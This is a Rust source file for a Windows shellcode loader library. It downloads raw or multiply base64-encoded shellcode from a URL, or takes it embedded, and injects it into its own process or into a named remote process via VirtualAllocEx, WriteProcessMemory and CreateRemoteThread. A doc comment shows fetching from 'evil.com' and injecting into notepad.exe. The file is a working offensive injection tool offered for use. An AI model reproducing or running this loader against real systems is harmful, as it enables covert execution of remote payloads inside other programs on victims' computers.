// ================
// Standard Library
// ================
use std::ptr;
use core::ffi::c_void;
// =====================
// External Dependencies
// =====================
use windows::{
    Win32::{
        Foundation::{
            CloseHandle,
            GetLastError,
            HANDLE,
            WIN32_ERROR,
            BOOL
        },
        System::{
            Diagnostics::Debug::WriteProcessMemory,
            Memory::{
                VirtualAllocEx, 
                VirtualProtectEx,
                MEM_COMMIT,
                MEM_RESERVE,
                PAGE_PROTECTION_FLAGS,
                PAGE_READWRITE,
                PAGE_EXECUTE_READ,
            },
            Threading::{
                INFINITE,
                OpenProcess,
                CreateRemoteThread,
                GetCurrentProcess,
                PROCESS_ALL_ACCESS,
                WaitForSingleObject
            }
        }
    },
};
use sysinfo::{ProcessExt, System, SystemExt, PidExt};
use reqwest::blocking::get;
use base64::{Engine as _, engine::general_purpose};

// ================
// Internal Modules
// ================
pub mod embedded;
pub mod b64embedded;


///
/// The possible types of shellcode loaders. They are:
/// 
/// * `Url`: Raw Shellcode over HTTP(S)
/// * `Base64Url`: B64-encoded (n-iterations) over HTTP(S)
/// * `Embedded`: You give the loader a raw [Vec<u8>] 
///    of shellcode to inject
/// * `Base64Embedded`: Instead of a raw [Vec], you use b64
///    (n-iterations) to create an obfuscated shellcode string,
///    which will be decoded at runtime
/// 
pub enum InjectorType {
    Url(String),
    Base64Url(String),
    Embedded(Vec<u8>),
    Base64Embedded(String)
}

///
/// The possible types of injections. Currently only 
/// `Reflective` and `Remote` are supported.
/// 
pub enum InjectionType {
    Reflect,
    Remote(String)
}

///
/// The `Injector` Trait comprises two functions: `inject()`, 
/// which performs the specified injection, and `load()`, 
/// which configures the Injector to load the shellcode from
/// a given source.
/// 
/// `Injector`s follow a builder pattern, meaning their 
/// implementation might be something like:
/// 
/// ```
/// let url_injector = UrlInjector::new()
///     .load(Url("https://evil.com/shellcode.bin"))?;
///     .wait(true)?
///     .inject(InjectionType::Remote("notepad.exe".to_string()))?
///     
/// url_injector.inject();
/// ```
/// 
/// This allows for more injector types with additional 
/// options to easily be built in the future.
/// 
pub trait Injector {
    fn load(self, sc_source: InjectorType) -> Result<Self, String> where 
        Self: Sized;

    fn wait(self, wait: bool) -> Result<Self, String>  where 
        Self: Sized;
    
    fn inject(&self, injection_type: InjectionType) -> Result<(), String>;
    
}

///
/// The generic function to write memory to either
/// our own our another process, depending on the handle.
/// 
pub unsafe fn write_mem(sc: &Vec<u8>, proc_h: HANDLE, base_addr: *mut c_void, wait: bool) -> Result<(), String> {

    let sc_len = sc.len();
    let mut n = 0;
    WriteProcessMemory(proc_h, base_addr, sc.as_ptr() as  _, sc_len, Some(&mut n));

    let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
    VirtualProtectEx(
        proc_h,
        base_addr,
        sc_len,
        PAGE_EXECUTE_READ,
        &mut old_protect
    );

    
    let h_thread = CreateRemoteThread(
        proc_h, 
        None, 
        0, 
        Some(std::mem::transmute(base_addr)), 
        None,
        0, 
        None
    )
    .unwrap();
    
    
    CloseHandle(proc_h);

    if wait {
        if WaitForSingleObject(h_thread, INFINITE) == WIN32_ERROR(0) {
            println!("Good!");
            println!("Injection completed!");
            Ok(())
        } else {
            let error = GetLastError();
            println!("{:?}", error);
            Err("Could not inject!".to_string())
        }
    } else {
        Ok(())
    }

}

///
/// Performs reflective injection.
///  
pub unsafe fn reflective_inject(sc: &Vec<u8>, wait: bool) -> Result<(), String> {
    let h: HANDLE = GetCurrentProcess();
    let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        
    write_mem(sc, h, addr, wait)
       
}

///
/// Performs remote injection.
/// 
/// Will attempt to find a process with the given name and inject.
///  
pub unsafe fn remote_inject(sc: &Vec<u8>, wait: bool, process_name: &str) -> Result<(), String>{


    // Enumerate processes
    let sys = System::new_all();
    let mut process_matches = sys.processes()
        .iter()
        .filter(|(&_pid, &ref proc)| proc.name() == process_name );

    match process_matches.nth(0) {
        Some((pid, proc)) => {
            let h: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, BOOL(0), pid.to_owned().as_u32()).unwrap();
            let addr = VirtualAllocEx(h, Some(ptr::null_mut()), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);              
            write_mem(sc, h, addr, wait)
        },
        None => Err("Could not find matching process!".to_string())
    }   
}

pub fn download_shellcode(url: &str) -> Result<Vec<u8>, String> {
    if let Ok(res) = get(url) {
        if res.status().is_success() {
            let sc: Vec<u8> = res.bytes().unwrap().to_vec();
            return Ok(sc);
        }
        Err("Couldn't download shellcode!".to_string())
    } else {
        Err("Couldn't connect!".to_string())
    }
}

pub fn decode_b64_shellcode(sc: &Vec<u8>, b64_iterations: usize) -> Result<Vec<u8>, String> {
    let mut shellcode_vec: Vec<u8> = sc.to_vec();
    for _i in 0..b64_iterations {
        match general_purpose::STANDARD.decode(shellcode_vec) {
            Ok(d) => {
                shellcode_vec = d;
            },
            Err(e) => { 
                let err_msg = e.to_string();
                return Err(err_msg.to_owned()); 
            }
        };
    }
    Ok(shellcode_vec)
}